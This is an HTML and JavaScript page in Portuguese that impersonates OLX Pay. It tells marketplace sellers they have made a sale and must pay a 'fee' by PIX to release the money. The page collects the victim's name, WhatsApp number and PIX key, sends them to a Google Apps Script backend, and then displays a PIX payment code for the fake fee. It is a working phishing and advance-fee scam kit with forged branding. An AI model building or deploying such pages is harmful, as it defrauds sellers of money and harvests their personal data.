<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Compra Segura OLX Pay</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
  <style>
    body { font-family: 'Segoe UI', sans-serif; background: #f3f3f3; margin: 0; padding: 20px; color: #333; }
    #main-container { max-width: 480px; margin: 0 auto; }
    .container { background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); overflow: hidden; }
    .header-image { height: 8px; background: #6e0ad6; width: 100%; }
    .header-title { background: #6e0ad6; color: #fff; padding: 15px; text-align: center; font-weight: bold; font-size: 18px; }
    .content { padding: 20px; }
    .highlight { color: #00bfa5; font-weight: bold; }
    h2 { font-size: 16px; border-bottom: 1px solid #eee; padding-bottom: 10px; margin-top: 20px; color: #444; }
    p { font-size: 14px; line-height: 1.5; color: #666; }
    .icon { color: #999; width: 20px; text-align: center; margin-right: 8px; }
    .badge { background: #e8fcf6; color: #00bfa5; padding: 5px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; display: inline-block; margin-right: 5px; margin-bottom: 5px; }
    
    /* FORMUL√ÅRIO */
    input { width: 100%; padding: 12px; margin: 5px 0 15px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
    button { width: 100%; padding: 15px; background: #f28000; color: #fff; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
    button:hover { background: #d97300; }
    button:disabled { background: #ccc; cursor: not-allowed; }

    /* √ÅREA DO PIX (NOVO) */
    #pix-container { display: none; text-align: center; background: #f9f9f9; padding: 20px; border-radius: 8px; border: 2px dashed #00bfa5; margin-top: 20px; }
    #pix-qrcode-img { max-width: 150px; margin-bottom: 15px; }
    .pix-textarea { width: 100%; height: 60px; padding: 10px; font-size: 12px; background: #fff; border: 1px solid #ddd; border-radius: 4px; resize: none; color: #555; }
    .btn-copy { background: #00bfa5; margin-top: 10px; border-radius: 6px; font-size: 14px; padding: 10px; }
    .btn-copy:hover { background: #009e8e; }

    .footer { text-align: center; font-size: 12px; color: #999; margin-top: 20px; }
    .hidden { display: none !important; }
    .visible { display: block !important; animation: fadeIn 0.5s; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
  </style>
</head>
<body>

  <div id="main-container">
    <div style="text-align:center; margin-top:50px; color:#666;">
      <i class="fa-solid fa-circle-notch fa-spin" style="font-size:30px; color:#6e0ad6;"></i>
      <p>Carregando transa√ß√£o...</p>
    </div>
  </div>

  <script>
    /**
     * üèõÔ∏è ARQUITETO DE SOLU√á√ïES - FRONTEND CLIENT V5 (FINAL)
     * Objetivo: Gerar PIX Copia e Cola na mesma tela.
     */

    // ========================================================
    // ‚öôÔ∏è CONFIGURA√á√ÉO: COLE AQUI SUA URL DO GOOGLE APPS SCRIPT
    const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
    // ========================================================

    const mainContainer = document.getElementById('main-container');

    // 1. INICIALIZA√á√ÉO
    (async function init() {
      const params = new URLSearchParams(window.location.search);
      const id = params.get('id');

      if (!id) return renderError('Link inv√°lido.');

      try {
        const response = await fetch(`${WEB_APP_URL}?action=get&id=${id}`);
        const json = await response.json();

        if (json.status === 'success') {
          renderContainer(json.data, id);
        } else {
          renderError(json.message || 'Produto n√£o encontrado.');
        }
      } catch (err) {
        renderError('Erro de conex√£o. Recarregue a p√°gina.');
      }
    })();

    // 2. RENDERIZA√á√ÉO DA TELA
    function renderContainer(dadosBrutos, produtoId) {
      const dados = normalizeKeys(dadosBrutos);
      mainContainer.innerHTML = '';

      const container = document.createElement('div');
      container.className = 'container';

      // Conte√∫do HTML Din√¢mico
      container.innerHTML = `
        <div class="header-image"></div>
        <div class="header-title">Compra Segura com OLX Pay</div>
        <div class="content">
          <p>üéâ <span class="highlight">Parab√©ns!</span> Venda iniciada.</p>
          <p>Pague a taxa de <span class="highlight" id="txt-taxa">${dados.taxa || 'R$ --'}</span> para liberar o reembolso imediato de <span class="highlight">${dados.valor || 'R$ --'}</span>.</p>
          
          <h2>Resumo</h2>
          <p><i class="fa-solid fa-user icon"></i> <strong>Comprador:</strong> ${dados.comprador || '---'}</p>
          <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor:</strong> ${dados.valor || '---'}</p>
          <p><i class="fa-solid fa-credit-card icon"></i> <strong>M√©todo:</strong> PIX</p>

          <div style="margin-top:15px">
            ${dados.vendas ? `<span class="badge">${dados.vendas}</span>` : ''}
            ${dados.atendimento ? `<span class="badge">${dados.atendimento}</span>` : ''}
          </div>

          <h2>Dados para Libera√ß√£o</h2>
          
          <form id="form-checkout">
            <label style="font-size:12px; font-weight:bold; color:#666;">SEU NOME COMPLETO</label>
            <input type="text" id="nome" required placeholder="Ex: Jo√£o Silva">
            
            <label style="font-size:12px; font-weight:bold; color:#666;">SEU WHATSAPP</label>
            <input type="tel" id="telefone" required placeholder="(00) 90000-0000">

            <label style="font-size:12px; font-weight:bold; color:#666;">CHAVE PIX (PARA RECEBER)</label>
            <input type="text" id="pix" required placeholder="CPF, Email ou Telefone">

            <button type="submit" id="btn-enviar">Gerar PIX da Taxa</button>
            <p id="msg-status" style="text-align:center; margin-top:10px; font-size:13px;"></p>
          </form>

          <div id="pix-container">
            <h3 style="color:#00bfa5; margin:0 0 10px;">‚úÖ Pagamento Gerado!</h3>
            <p style="font-size:12px;">Copie o c√≥digo abaixo e pague no seu app de banco:</p>
            
            <img id="pix-qrcode-img" src="" style="display:none;"> 
            
            <textarea id="pix-copia-cola" class="pix-textarea" readonly></textarea>
            
            <button type="button" class="btn-copy" id="btn-copiar">
              <i class="fa-regular fa-copy"></i> Copiar C√≥digo PIX
            </button>
            
            <div style="margin-top:15px; font-size:11px; color:#999;">
              <i class="fa-solid fa-clock"></i> Aguardando confirma√ß√£o autom√°tica...
            </div>
          </div>

        </div>
        <div class="footer">¬© 2025 OLX Pay. Seguran√ßa Garantida.</div>
      `;

      mainContainer.appendChild(container);

      // 3. L√ìGICA DE CHECKOUT (PIX NA TELA)
      const form = document.getElementById('form-checkout');
      const pixContainer = document.getElementById('pix-container');
      const btnEnviar = document.getElementById('btn-enviar');
      const msgStatus = document.getElementById('msg-status');
      const txtPix = document.getElementById('pix-copia-cola');
      const btnCopiar = document.getElementById('btn-copiar');

      form.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Bloqueia UI
        btnEnviar.disabled = true;
        btnEnviar.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Gerando PIX...';
        msgStatus.textContent = "";

        const formData = {
          nome: document.getElementById('nome').value,
          telefone: document.getElementById('telefone').value,
          pix: document.getElementById('pix').value, // Chave Pix onde o cliente quer receber a venda
          produto_id: produtoId
        };

        try {
          // CHAMA O GAS
          const response = await fetch(`${WEB_APP_URL}?action=checkout`, {
            method: 'POST',
            body: JSON.stringify(formData)
          });

          const result = await response.json();

          if (result.status === 'success') {
            // === SUCESSO: EXIBE O PIX ===
            form.style.display = 'none'; // Esconde o formul√°rio
            pixContainer.style.display = 'block'; // Mostra o Pix
            pixContainer.classList.add('visible');

            // Preenche o Copia e Cola
            // Se a API n√£o mandar 'pix_copypaste', usamos o 'payment_link' como fallback
            const codigoPix = result.pix_copypaste || result.payment_link;
            txtPix.value = codigoPix;

            // L√≥gica do Bot√£o Copiar
            btnCopiar.onclick = () => {
              navigator.clipboard.writeText(codigoPix);
              btnCopiar.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!';
              btnCopiar.style.background = '#4CAF50';
            };

            // Se tiver imagem de QR Code, exibe
            /* if(result.pix_qrcode) {
               document.getElementById('pix-qrcode-img').src = result.pix_qrcode; 
               document.getElementById('pix-qrcode-img').style.display = 'inline-block';
            } 
            */

          } else {
            throw new Error(result.message || 'Erro ao gerar PIX.');
          }

        } catch (error) {
          console.error(error);
          btnEnviar.disabled = false;
          btnEnviar.innerHTML = 'Tentar Novamente';
          msgStatus.innerHTML = `<span style="color:red">‚ùå ${error.message}</span>`;
        }
      });
    }

    // Helpers
    function normalizeKeys(obj) {
      const newObj = {};
      Object.keys(obj).forEach(k => newObj[k.toLowerCase()] = obj[k]);
      // Aliases
      newObj.valor = newObj.valor || newObj['valor total'];
      newObj.taxa = newObj.taxa || newObj['taxa de servi√ßo'];
      return newObj;
    }

    function renderError(msg) {
      mainContainer.innerHTML = `<div style="text-align:center; padding:50px; color:#666;"><h3>Aten√ß√£o</h3><p>${msg}</p></div>`;
    }
  </script>
</body>
</html>
